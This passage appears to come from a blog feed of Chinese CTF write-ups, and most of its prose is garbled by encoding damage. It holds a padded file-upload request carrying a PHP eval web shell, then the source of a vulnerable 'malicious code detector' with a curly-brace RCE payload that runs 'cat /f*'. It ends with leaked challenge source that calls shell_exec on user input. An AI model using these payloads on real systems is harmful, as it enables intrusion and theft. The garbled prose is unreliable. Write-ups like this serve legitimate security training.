aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa</span><br><span class="line">&lt;?php @eval(<span class="built_in">$</span><span class="built_in">_</span>POST[&#x27;a&#x27;]); ?&gt;</span><br><span class="line">------WebKitFormBoundaryFClPxPRBk7fIw7Nh--</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>ç„¶ågetshellæ‹¿åˆ°flag</p><h2 id="æ¶æ„ä»£ç æ£€æµ‹å™¨"><a href="#æ¶æ„ä»£ç æ£€æµ‹å™¨" class="headerlink" title="æ¶æ„ä»£ç æ£€æµ‹å™¨"></a>æ¶æ„ä»£ç æ£€æµ‹å™¨</h2><p><a href="http://www.zipæ³„éœ²æºç /">www.zipæ³„éœ²æºç </a></p><p>tp6æ¡†æ¶ï¼Œç½‘ä¸Šæ²¡æ‰¾åˆ°</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">app</span>\<span class="title class_">controller</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">app</span>\<span class="title">BaseController</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Index</span> <span class="keyword">extends</span> <span class="title">BaseController</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$code</span> = <span class="title function_ invoke__">preg_replace</span>(<span class="string">&quot;/[\&quot;;&#x27;%\\\\]/&quot;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$_POST</span>[<span class="string">&#x27;code&#x27;</span>]);</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/openlog|syslog|readlink|mail|symlink|popen|passthru|scandir|show_source|assert|fwrite|curl|php|system|eval|cookie|assert|new|session|str|source|passthru|exec|request|require|include|link|base|exec|reverse|open|popen|getallheaders|next|prev|f|conv|ch|hex|end|ord|post|get|array_reverse|\~|\`|\#|\%|\^|\&amp;|\*|\-|\+|\[|\]|\_|\&lt;|\&gt;|\/|\?|\\\\/is&#x27;</span>, <span class="variable">$code</span>)) &#123;</span><br><span class="line"></span><br><span class="line">            <span class="variable">$attack_log_file</span> = <span class="string">&#x27;/tmp/attack.log&#x27;</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>(<span class="title function_ invoke__">file_exists</span>(<span class="variable">$attack_log_file</span>)) &#123;</span><br><span class="line">                <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$attack_log_file</span>, <span class="string">&#x27;$attack_word=\&#x27;&#x27;</span>.<span class="variable">$code</span>.<span class="string">&#x27;\&#x27;;&#x27;</span>.<span class="string">&quot;\r\n&quot;</span>,FILE_APPEND);</span><br><span class="line">                <span class="keyword">require_once</span>(<span class="string">&#x27;/tmp/attack.log&#x27;</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$attack_log_file</span>, <span class="string">&#x27;&lt;&#x27;</span>.<span class="string">&#x27;?&#x27;</span>.<span class="string">&#x27;php&#x27;</span>.<span class="string">&quot;\r\n&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$attack_word</span>))&#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&#x27;æ£€æµ‹åˆ°å±é™©ä»£ç : &#x27;</span>.<span class="variable">$attack_word</span>.<span class="string">&#x27;ï¼ï¼ï¼&#x27;</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span>&#123;</span><br><span class="line">              <span class="keyword">echo</span> <span class="string">&#x27;æ¬¢è¿ä½¿ç”¨gxngxngxnçš„æ¶æ„ä»£ç æ£€æµ‹å™¨ï¼ï¼ï¼&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="variable">$safe_log_file</span> = <span class="string">&#x27;/tmp/safe.log&#x27;</span>;</span><br><span class="line">            <span class="keyword">if</span>(<span class="title function_ invoke__">file_exists</span>(<span class="variable">$safe_log_file</span>)) &#123;</span><br><span class="line">                <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$safe_log_file</span>, <span class="string">&#x27;$safe_word=&quot;&#x27;</span>.<span class="variable">$code</span>.<span class="string">&#x27;&quot;;&#x27;</span>.<span class="string">&quot;\r\n&quot;</span>,FILE_APPEND);</span><br><span class="line">                <span class="keyword">require_once</span>(<span class="string">&#x27;/tmp/safe.log&#x27;</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$safe_log_file</span>, <span class="string">&#x27;&lt;&#x27;</span>.<span class="string">&#x27;?&#x27;</span>.<span class="string">&#x27;php&#x27;</span>.<span class="string">&quot;\r\n&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$safe_word</span>))&#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&#x27;æœªæ£€æµ‹åˆ°å±é™©ä»£ç ï¼Œ&#x27;</span>.<span class="variable">$safe_word</span>.<span class="string">&#x27;ï¼Œéå¸¸å®‰å…¨&#x27;</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span>&#123;</span><br><span class="line">              <span class="keyword">echo</span> <span class="string">&#x27;æ¬¢è¿ä½¿ç”¨gxngxngxnçš„æ¶æ„ä»£ç æ£€æµ‹å™¨ï¼ï¼ï¼&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¼•å·æ²¡äº†ï¼Œæœ‰ä¸ªç‰¹æ€§å°±æ˜¯åˆ©ç”¨<code>&#123;&#125;</code>è¿›è¡ŒRCE</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">POST:/public/index.php</span><br><span class="line">code=<span class="built_in">$</span>&#123;input(0)(input(1))&#125;<span class="built_in">&amp;</span>0=system<span class="built_in">&amp;</span>1=cat /f*</span><br></pre></td></tr></table></figure><p>åˆ©ç”¨inputå‡½æ•°ç»•è¿‡å¼•å·ï¼Œç„¶åæ‹¿åˆ°flagï¼Œä½†æ˜¯å“ˆè¿™é‡Œ${}è¢«å•å¼•å·åŒ…è£¹çš„æ—¶å€™å°±ä¸èƒ½rceï¼Œè€Œæ˜¯è¢«å½“ä½œå­—é¢é‡ï¼Œæ‰€ä»¥éœ€è¦ç»•è¿‡</p>]]></content>
      
      
      <categories>
          
          <category> èµ›é¢˜ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> è„æ•°æ® </tag>
            
            <tag> flaskå†…å­˜é©¬ </tag>
            
            <tag> phpç‰¹æ€§{}rce </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ctfshowç»ˆæè€ƒæ ¸ï¼ˆæœªå®Œï¼‰</title>
      <link href="/2025/11/05/ctfshow%E7%BB%88%E6%9E%81%E8%80%83%E6%A0%B8/"/>
      <url>/2025/11/05/ctfshow%E7%BB%88%E6%9E%81%E8%80%83%E6%A0%B8/</url>
      
        <content type="html"><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>ç¬¬ä¸€æ¬¡æ¥è§¦è¿™å†…ç½‘æ¸—é€ï¼Œæ”¶è·è¿˜æ˜¯æŒºå¤šçš„ï¼å¯¹æ€è·¯çš„æå‡è¿˜æ˜¯å¾ˆä¸é”™çš„!ä¸‹é¢ä¸€èµ·æ¥å“é‰´ä¸€ä¸‹å§ï¼ç€é‡æ•´ä½“æ€è·¯çš„åˆ†æï¼Œæœ‰äº›ç»†èŠ‚å¯èƒ½ä¸ä¼šå»å†™ï¼</p><h2 id="ä¿¡æ¯æ”¶é›†å’Œæ¼æ´åˆ©ç”¨"><a href="#ä¿¡æ¯æ”¶é›†å’Œæ¼æ´åˆ©ç”¨" class="headerlink" title="ä¿¡æ¯æ”¶é›†å’Œæ¼æ´åˆ©ç”¨"></a>ä¿¡æ¯æ”¶é›†å’Œæ¼æ´åˆ©ç”¨</h2><p>æˆ‘ä»¬çš„ç›®æ ‡å…¶å®å°±æ˜¯å›´ç»•è¿™3ä¸ªæ ‡é¢˜å±•å¼€çš„</p><h3 id="index-php"><a href="#index-php" class="headerlink" title="&#x2F;index.php"></a>&#x2F;index.php</h3><p>æŠ“åŒ…å“åº”å¤´é‡Œé¢æœ‰ä¸ªflagï¼Œç›®å½•æ‰«ææ‰«å‡ºä¸ªsource.txt</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;init.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">addUser</span>(<span class="params"><span class="variable">$data</span>,<span class="variable">$username</span>,<span class="variable">$password</span></span>)</span>&#123;</span><br><span class="line"><span class="variable">$ret</span> = <span class="keyword">array</span>(</span><br><span class="line"><span class="string">&#x27;code&#x27;</span>=&gt;<span class="number">0</span>,</span><br><span class="line"><span class="string">&#x27;message&#x27;</span>=&gt;<span class="string">&#x27;Ã¦Â·Â»Ã¥Å  Ã¦Ë†ÂÃ¥Å Å¸&#x27;</span></span><br><span class="line">);</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">existsUser</span>(<span class="variable">$data</span>,<span class="variable">$username</span>)==<span class="number">0</span>)&#123;</span><br><span class="line"><span class="variable">$s</span> = <span class="variable">$data</span>.<span class="variable">$username</span>.<span class="string">&#x27;@&#x27;</span>.<span class="variable">$password</span>.<span class="string">&#x27;|&#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">file_put_contents</span>(DB_PATH, <span class="variable">$s</span>);</span><br><span class="line"></span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="variable">$ret</span>[<span class="string">&#x27;code&#x27;</span>]=-<span class="number">1</span>;</span><br><span class="line"><span class="variable">$ret</span>[<span class="string">&#x27;message&#x27;</span>]=<span class="string">&#x27;Ã§â€Â¨Ã¦Ë†Â·Ã¥Â·Â²Ã¥Â­ËœÃ¥Å“Â¨&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="title function_ invoke__">json_encode</span>(<span class="variable">$ret</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">updateUser</span>(<span class="params"><span class="variable">$data</span>,<span class="variable">$username</span>,<span class="variable">$password</span></span>)</span>&#123;</span><br><span class="line"><span class="variable">$ret</span> = <span class="keyword">array</span>(</span><br><span class="line"><span class="string">&#x27;code&#x27;</span>=&gt;<span class="number">0</span>,</span><br><span class="line"><span class="string">&#x27;message&#x27;</span>=&gt;<span class="string">&#x27;Ã¦â€ºÂ´Ã¦â€“Â°Ã¦Ë†ÂÃ¥Å Å¸&#x27;</span></span><br><span class="line">);</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">existsUser</span>(<span class="variable">$data</span>,<span class="variable">$username</span>)&gt;<span class="number">0</span> &amp;&amp; <span class="variable">$username</span>!=<span class="string">&#x27;admin&#x27;</span>)&#123;</span><br><span class="line"><span class="variable">$s</span> = <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/&#x27;</span>.<span class="variable">$username</span>.<span class="string">&#x27;@[0-9a-zA-Z]+\|/&#x27;</span>, <span class="variable">$username</span>.<span class="string">&#x27;@&#x27;</span>.<span class="variable">$password</span>.<span class="string">&#x27;|&#x27;</span>, <span class="variable">$data</span>);</span><br><span class="line"><span class="title function_ invoke__">file_put_contents</span>(DB_PATH, <span class="variable">$s</span>);</span><br><span class="line"></span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="variable">$ret</span>[<span class="string">&#x27;code&#x27;</span>]=-<span class="number">1</span>;</span><br><span class="line"><span class="variable">$ret</span>[<span class="string">&#x27;message&#x27;</span>]=<span class="string">&#x27;Ã§â€Â¨Ã¦Ë†Â·Ã¤Â¸ÂÃ¥Â­ËœÃ¥Å“Â¨Ã¦Ë†â€“Ã¦â€” Ã¦ÂÆ’Ã¦â€ºÂ´Ã¦â€“Â°&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="title function_ invoke__">json_encode</span>(<span class="variable">$ret</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">delUser</span>(<span class="params"><span class="variable">$data</span>,<span class="variable">$username</span></span>)</span>&#123;</span><br><span class="line"><span class="variable">$ret</span> = <span class="keyword">array</span>(</span><br><span class="line"><span class="string">&#x27;code&#x27;</span>=&gt;<span class="number">0</span>,</span><br><span class="line"><span class="string">&#x27;message&#x27;</span>=&gt;<span class="string">&#x27;Ã¥Ë† Ã©â„¢Â¤Ã¦Ë†ÂÃ¥Å Å¸&#x27;</span></span><br><span class="line">);</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">existsUser</span>(<span class="variable">$data</span>,<span class="variable">$username</span>)&gt;<span class="number">0</span> &amp;&amp; <span class="variable">$username</span>!=<span class="string">&#x27;admin&#x27;</span>)&#123;</span><br><span class="line"><span class="variable">$s</span> = <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/&#x27;</span>.<span class="variable">$username</span>.<span class="string">&#x27;@[0-9a-zA-Z]+\|/&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$data</span>);</span><br><span class="line"><span class="title function_ invoke__">file_put_contents</span>(DB_PATH, <span class="variable">$s</span>);</span><br><span class="line"></span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="variable">$ret</span>[<span class="string">&#x27;code&#x27;</span>]=-<span class="number">1</span>;</span><br><span class="line"><span class="variable">$ret</span>[<span class="string">&#x27;message&#x27;</span>]=<span class="string">&#x27;Ã§â€Â¨Ã¦Ë†Â·Ã¤Â¸ÂÃ¥Â­ËœÃ¥Å“Â¨Ã¦Ë†â€“Ã¦â€” Ã¦ÂÆ’Ã¥Ë† Ã©â„¢Â¤&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="title function_ invoke__">json_encode</span>(<span class="variable">$ret</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">existsUser</span>(<span class="params"><span class="variable">$data</span>,<span class="variable">$username</span></span>)</span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/&#x27;</span>.<span class="variable">$username</span>.<span class="string">&#x27;@[0-9a-zA-Z]+\|/&#x27;</span>, <span class="variable">$data</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">initCache</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="title function_ invoke__">file_exists</span>(<span class="string">&#x27;cache.php&#x27;</span>)?:<span class="title function_ invoke__">file_put_contents</span>(<span class="string">&#x27;cache.php&#x27;</span>,<span class="string">&#x27;&lt;!-- ctfshow-web-cache --&gt;&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">clearCache</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="title function_ invoke__">shell_exec</span>(<span class="string">&#x27;rm -rf cache.php&#x27;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="string">&#x27;ok&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">flushCache</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">file_exists</span>(<span class="string">&#x27;cache.php&#x27;</span>) &amp;&amp; <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;cache.php&#x27;</span>)===<span class="literal">false</span>)&#123;</span><br><span class="line"><span class="keyword">return</span> FLAG646;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">netTest</span>(<span class="params"><span class="variable">$cmd</span></span>)</span>&#123;</span><br><span class="line"><span class="variable">$ret</span> = <span class="keyword">array</span>(</span><br><span class="line"><span class="string">&#x27;code&#x27;</span>=&gt;<span class="number">0</span>,</span><br><span class="line"><span class="string">&#x27;message&#x27;</span>=&gt;<span class="string">&#x27;Ã¥â€˜Â½Ã¤Â»Â¤Ã¦â€°Â§Ã¨Â¡Å’Ã¥Â¤Â±Ã¨Â´Â¥&#x27;</span></span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/ping ((2(5[0-5]|[0-4]\d))|[0-1]?\d&#123;1,2&#125;)(\.((2(5[0-5]|[0-4]\d))|[0-1]?\d&#123;1,2&#125;))&#123;3&#125;/&#x27;</span>, <span class="variable">$cmd</span>))&#123;</span><br><span class="line"><span class="variable">$res</span> = <span class="title function_ invoke__">shell_exec</span>(<span class="variable">$cmd</span>);</span><br><span class="line"><span class="title function_ invoke__">stripos</span>(PHP_OS,<span class="string">&#x27;WIN&#x27;</span>)!==<span class="literal">FALSE</span>?<span class="variable">$ret</span>[<span class="string">&#x27;message&#x27;</span>]=<span class="title function_ invoke__">iconv</span>(<span class="string">&quot;GBK&quot;</span>, <span class="string">&quot;UTF-8&quot;</span>, <span class="variable">$res</span>):<span class="variable">$ret</span>[<span class="string">&#x27;message&#x27;</span>]=<span class="variable">$res</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^[A-Za-z]+$/&#x27;</span>, <span class="variable">$cmd</span>))&#123;</span><br><span class="line"><span class="variable">$res</span> = <span class="title function_ invoke__">shell_exec</span>(<span class="variable">$cmd</span>);</span><br><span class="line"><span class="title function_ invoke__">stripos</span>(PHP_OS,<span class="string">&#x27;WIN&#x27;</span>)!==<span class="literal">FALSE</span>?<span class="variable">$ret</span>[<span class="string">&#x27;message&#x27;</span>]=<span class="title function_ invoke__">iconv</span>(<span class="string">&quot;GBK&quot;</span>, <span class="string">&quot;UTF-8&quot;</span>, <span class="variable">$res</span>):<span class="variable">$ret</span>[<span class="string">&#x27;message&#x27;</span>]=<span class="variable">$res</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="title function_ invoke__">json_encode</span>(<span class="variable">$ret</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>å…¨æ˜¯ä¸€äº›å‡½æ•°ä¸çŸ¥é“æœ‰å•¥ç”¨ï¼</p><p>ç½‘é¡µæºç çš„cssè·¯å¾„æ³„éœ²äº†ç›®å½•ï¼<code>/system36d/</code>ã€‚è¿™ä¸ªé¡µé¢çš„åˆ©ç”¨ä»·å€¼å·²ç»æ²¡äº†ï¼Œè¿›å…¥ä¸‹ä¸€ä¸ªç¯èŠ‚</p><h3 id="system36d"><a href="#system36d" class="headerlink" title="&#x2F;system36d&#x2F;"></a>&#x2F;system36d&#x2F;</h3><p>è®¿é—®è¿™ä¸ªç›®å½•ï¼Œå‘ç°æœ‰é‡å®šå‘ï¼ŒæŠ“åŒ…åˆ†æï¼æ‹¿åˆ°web642çš„flag</p><p>ç„¶åæ˜¯ä¸ªå¯†ç é”ï¼Œå‘ç°åœ¨å°è¯•å¯†ç çš„æ—¶å€™æ— æ•°æ®åŒ…çš„å‘ç”Ÿï¼Œé‚£ä¹ˆå¤„ç†é€»è¾‘ä¸€å®šæ˜¯å‰ç«¯jsï¼Œæœç„¶å¯†ç æ˜¯<code>0x36D</code>ï¼Œå¹¶ä¸”æ‹¿åˆ°web644çš„flagï¼</p><p><img src="/images/achieve/2025/11/11.png"></p><p>æ¥åˆ°åå°ï¼Œä¸€å 